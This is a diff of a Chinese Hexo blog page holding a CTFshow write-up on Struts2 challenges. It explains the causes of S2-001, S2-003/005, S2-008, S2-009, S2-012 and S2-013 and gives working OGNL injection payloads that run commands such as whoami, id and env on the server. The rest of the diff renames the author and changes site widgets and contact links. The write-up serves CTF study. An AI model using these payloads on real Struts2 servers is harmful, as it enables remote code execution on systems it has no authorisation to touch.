@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CTFshowJava, Jlan&#39;s Little World">
+    <meta name="keywords" content="CTFshowJava, J1an&#39;s Little World">
     <meta name="description" content="CTFshow Java全部题都是struts2框架漏洞
 Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
 注意以下所有漏洞都可以直接利用公开的脚本进行一键利用
@@ -23,7 +23,7 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CTFshowJava | Jlan&#39;s Little World</title>
+    <title>CTFshowJava | J1an&#39;s Little World</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -51,8 +51,6 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
 
 
     
-        <link rel="stylesheet" type="text/css" href="/css/reward.css">
-    
 
 
 
@@ -70,7 +68,7 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Jlan&#39;s Little World</span>
+                    <span class="logo-span">J1an&#39;s Little World</span>
                 </a>
             </div>
             
@@ -91,55 +89,11 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/archives" class="waves-effect waves-light">
       
       <i class="fas fa-archive" style="zoom: 0.6;"></i>
       
       <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
     </a>
     
   </li>
@@ -174,7 +128,7 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Jlan&#39;s Little World</div>
+        <div class="logo-name">J1an&#39;s Little World</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -197,55 +151,11 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
         
         <li class="m-nav-item">
 	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
 		<a href="/archives" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-archive"></i>
 			
 			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
 		</a>
           
         </li>
@@ -397,6 +307,9 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
 
         
 
@@ -472,7 +385,14 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
 </li>
 </ol>
 <p>payload：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取tomcat路径</span></span><br><span class="line">%&#123;<span class="string">&quot;tomcatBinDir&#123;&quot;</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&quot;user.dir&quot;)</span>+<span class="string">&quot;&#125;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取web路径</span></span><br><span class="line">%&#123;#req=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getRequest()</span>,#response=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 命令执行 env，flag就在其中</span></span><br><span class="line">%&#123;#a=(<span class="keyword">new</span> java.lang.ProcessBuilder(<span class="keyword">new</span> java.lang.String[]&#123;<span class="string">&quot;env&quot;</span>&#125;)).redirectErrorStream(<span class="keyword">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> java.io.InputStreamReader(#b),#d=<span class="keyword">new</span> java.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 获取tomcat路径</span>
+<span class="token operator">%</span><span class="token punctuation">&#123;</span><span class="token string">"tomcatBinDir&#123;"</span><span class="token operator">+</span><span class="token annotation punctuation">@java.lang.System</span><span class="token annotation punctuation">@getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token punctuation">&#125;</span>
+
+<span class="token comment">// 获取web路径</span>
+<span class="token operator">%</span><span class="token punctuation">&#123;</span>#req<span class="token operator">=</span><span class="token annotation punctuation">@org.apache.struts2.ServletActionContext</span><span class="token annotation punctuation">@getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response<span class="token operator">=</span>#context<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>#req<span class="token punctuation">.</span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token char">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
+
+<span class="token comment">// 命令执行 env，flag就在其中</span>
+<span class="token operator">%</span><span class="token punctuation">&#123;</span>#a<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"env"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#b<span class="token operator">=</span>#a<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span>#b<span class="token punctuation">)</span><span class="token punctuation">,</span>#d<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span>#c<span class="token punctuation">)</span><span class="token punctuation">,</span>#e<span class="token operator">=</span><span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">50000</span><span class="token punctuation">]</span><span class="token punctuation">,</span>#d<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>#e<span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token operator">=</span>#context<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">(</span>#e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="280"><a href="#280" class="headerlink" title="280"></a>280</h2><p>漏洞：S2-003 S2-005 <em>CVE-2008-6504</em></p>
 <p>漏洞成因：</p>
@@ -506,7 +426,7 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
 <li>当拦截器执行结束后会将jsp内容进行解析，会从OgnlValueStack的overrides属性中寻找key为age的键值对并执行ognl表达式</li>
 </ol>
 <p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]&#x3D;true,#foo&#x3D;new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]&#x3D;#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())) + &#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="282"><a href="#282" class="headerlink" title="282"></a>282</h2><p>漏洞：S2-008 <em>CVE-2012-0391</em></p>
 <p>漏洞成因：Struts2框架存在一个devmode模式,当devmode模式开启时,Struts2对传入的参数没有严格限制,导致多个地方可以执行恶意代码</p>
@@ -518,7 +438,7 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
 </ol>
 <p>漏洞修复：在之后的版本中使用正则表达式来防止内容执行</p>
 <p>Payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=%28%23_memberAccess%5B&quot;allowStaticMethodAccess&quot;%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28&quot;false&quot;%29%20%2C%23context%5B&quot;xwork.MethodAccessor.denyMethodExecution&quot;%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?debug&#x3D;command&amp;expression&#x3D;%28%23_memberAccess%5B&quot;allowStaticMethodAccess&quot;%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28&quot;false&quot;%29%20%2C%23context%5B&quot;xwork.MethodAccessor.denyMethodExecution&quot;%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="283"><a href="#283" class="headerlink" title="283"></a>283</h2><p>漏洞：S2-009 <em>CVE-2011-3923</em></p>
 <p>漏洞成因：Struts2框架中ParametersInterceptor拦截器只检查传入的参数名是否合法,不会检查参数值，例如传入参数<code>top[&#39;foo&#39;](0)</code>会通过ParametersInterceptor的白名单检查,OGNL会将其解析为(top[‘foo’])(0),并将foo的值也作为OGNL表达式进行计算从而造成代码执行</p>
@@ -530,7 +450,7 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
 <li>当有形似(one)(two)的变量时，one会被当作一个OGNL表达式去计算，然后把它的结果当作另一个以two为根对象的OGNL表达式再一次计算，所以，如果one有返回内容，那么这些内容将会被当作OGNL语句被计算，而payload结尾传入的<code>z[(name)(%27meh%27)]</code>就是为了把name参数的值当作OGNL表达式计算</li>
 </ol>
 <p>payload：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?age=<span class="number">12313</span>&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>]=+<span class="keyword">new</span>+java.lang.Boolean(<span class="keyword">false</span>),+%23_memberAccess[%22allowStaticMethodAccess%<span class="number">22</span>]=<span class="keyword">true</span>,+%23a=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(%27whoami%<span class="number">27</span>).getInputStream(),%23b=<span class="keyword">new</span>+java.io.InputStreamReader(%23a),%23c=<span class="keyword">new</span>+java.io.BufferedReader(%23b),%<span class="number">23d</span>=<span class="keyword">new</span>+<span class="keyword">char</span>[<span class="number">51020</span>],%23c.read(%<span class="number">23d</span>),%23kxlzx=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getWriter(),%23kxlzx.println(%<span class="number">23d</span>),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%<span class="number">27</span>)] </span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">?</span>age<span class="token operator">=</span><span class="token number">12313</span><span class="token operator">&amp;</span>name<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">23</span>context<span class="token punctuation">[</span><span class="token operator">%</span><span class="token number">22</span>xwork<span class="token punctuation">.</span>MethodAccessor<span class="token punctuation">.</span>denyMethodExecution<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">+</span><span class="token keyword">new</span><span class="token operator">+</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Boolean</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">+</span><span class="token operator">%</span><span class="token number">23_</span>memberAccess<span class="token punctuation">[</span><span class="token operator">%</span><span class="token number">22</span>allowStaticMethodAccess<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token operator">+</span><span class="token operator">%</span><span class="token number">23</span>a<span class="token operator">=</span><span class="token annotation punctuation">@java.lang.Runtime</span><span class="token annotation punctuation">@getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">27</span>whoami<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>b<span class="token operator">=</span><span class="token keyword">new</span><span class="token operator">+</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">23</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>c<span class="token operator">=</span><span class="token keyword">new</span><span class="token operator">+</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">23</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23d</span><span class="token operator">=</span><span class="token keyword">new</span><span class="token operator">+</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">51020</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>c<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">23d</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>kxlzx<span class="token operator">=</span><span class="token annotation punctuation">@org.apache.struts2.ServletActionContext</span><span class="token annotation punctuation">@getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>kxlzx<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">23d</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>kxlzx<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>meh<span class="token punctuation">)</span><span class="token operator">&amp;</span>z<span class="token punctuation">[</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">27</span>meh<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="284"><a href="#284" class="headerlink" title="284"></a>284</h2><p>漏洞：S2-012 <em>CVE-2013-1965</em></p>
 <p>漏洞成因：在Struts2框架中，如果配置Action中的Result时使用了重定向类型，并且还使用${param_name}作为重定向变量，当触发redirect类型返回时，Struts2使用${param_name}获取其值，在这个过程中会对name参数的值执行OGNL表达式解析,从而可以插入任意OGNL表达式导致任意代码执行</p>
@@ -552,7 +472,7 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
 </li>
 </ol>
 <p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="285"><a href="#285" class="headerlink" title="285"></a>285</h2><p>漏洞：S2-013 <em>CVE-2013-1966</em></p>
 <p>漏洞成因：在Struts2标签中和都包含一个includeParams属性，其值可设置为none、get 或 all，其对应意义分别为：none:链接不包含请求的任意参数值(默认)，get:链接只包含GET请求中的参数和其值，all:链接包含GET和POST所有参数和其值，用来显示一个超链接,当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上，这个参数会进行OGNL表达式解析，从而可以插入任意OGNL表达式导致任意代码执行</p>
@@ -570,7 +490,7 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
 <li>继续跟入就是translateVariables函数了，OGNL表达式在这里被执行<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161720361.png"></li>
 </ol>
 <p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=%24%7B%23_memberAccess%5B&quot;allowStaticMethodAccess&quot;%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27whoami%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D </span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?a&#x3D;%24%7B%23_memberAccess%5B&quot;allowStaticMethodAccess&quot;%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27whoami%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
@@ -606,7 +526,7 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Jlan</a>
+                    <a href="/about" rel="external nofollow noreferrer">J1an</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -629,7 +549,7 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Jlan</a>
+                    <a href="/about" target="_blank">J1an</a>
                     !
                 </span>
             </div>
@@ -672,39 +592,6 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
 
                 </div>
             </div>
-            
-                <div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
             
         </div>
     </div>
@@ -756,7 +643,7 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -793,7 +680,7 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -812,6 +699,9 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
@@ -920,69 +810,15 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="/libs/aplayer/Meting.min.js"></script>
-
-    
 
     <div class="container row center-align"
          style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2022</span>
+                <span id="year">2022</span>
             
-            <a href="/about" target="_blank">Jlan</a>
+            <a href="/about" target="_blank">J1an</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
@@ -1017,7 +853,7 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:jlan@icloud.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
     </a>
 
@@ -1025,10 +861,8 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
+    <a href="https://twitter.com/J1an45" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/J1an45" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
     </a>
 
 
@@ -1037,9 +871,7 @@ Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架
 
 
 
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
+
 
 </div>
     </div>
@@ -1199,6 +1031,14 @@ $(function () {
     
 
     <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
     
 
      
@@ -1225,8 +1065,6 @@ $(function () {
     })();
 </script>
 
-    
